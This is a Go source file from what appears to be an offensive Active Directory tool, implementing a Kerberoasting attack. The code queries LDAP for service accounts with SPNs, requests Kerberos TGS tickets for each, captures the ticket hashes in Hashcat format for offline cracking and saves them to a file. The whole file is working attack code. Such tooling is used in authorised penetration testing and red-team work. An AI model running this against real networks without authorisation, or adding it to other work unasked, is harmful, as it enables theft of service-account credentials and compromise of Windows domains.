package attacks

import (
	"context"
	"fmt"
	"os"
	"strings"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
)

// Kerberoast enumerates SPN accounts and captures TGS hashes in Hashcat format.
// Requires valid credentials.
func Kerberoast(ctx context.Context, opts *config.Options) ([]string, error) {
	// Step 1: LDAP — find all Kerberoastable accounts
	ldapCl, err := recon.NewLDAPClient(opts)
	if err != nil {
		return nil, fmt.Errorf("LDAP connect: %w", err)
	}
	defer ldapCl.Close()

	targets, err := ldapCl.QuerySPNUsers(ctx)
	if err != nil {
		return nil, fmt.Errorf("SPN query: %w", err)
	}

	if len(targets) == 0 {
		output.Info("No Kerberoastable accounts found (no enabled users with SPN)")
		return nil, nil
	}

	output.Info("Found %d target(s) — requesting TGS tickets...", len(targets))
	for _, u := range targets {
		output.Info("  → %s (SPNs: %s)", u.SAMAccountName, strings.Join(u.SPNs, ", "))
	}

	// Step 2: Kerberos — request TGS for each account
	krbCl, err := recon.NewKerberosClient(opts)
	if err != nil {
		return nil, fmt.Errorf("Kerberos client: %w", err)
	}
	defer krbCl.Close()

	var hashes []string
	for _, user := range targets {
		for _, spn := range user.SPNs {
			output.Info("  Requesting TGS: %s / %s", user.SAMAccountName, spn)
			hash, err := krbCl.KerberoastHash(user.SAMAccountName, spn)
			if err != nil {
				output.Warn("  Failed for %s: %v", spn, err)
				continue
			}
			hashes = append(hashes, hash)
			output.Success("  Hash captured: %s...%s",
				hash[:min(len(hash), 60)], "[truncated]")
		}
	}
	return hashes, nil
}

// SaveHashes writes a slice of hashes to a file (one per line).
func SaveHashes(filename string, hashes []string) error {
	f, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer f.Close()
	for _, h := range hashes {
		fmt.Fprintln(f, h)
	}
	return nil
}
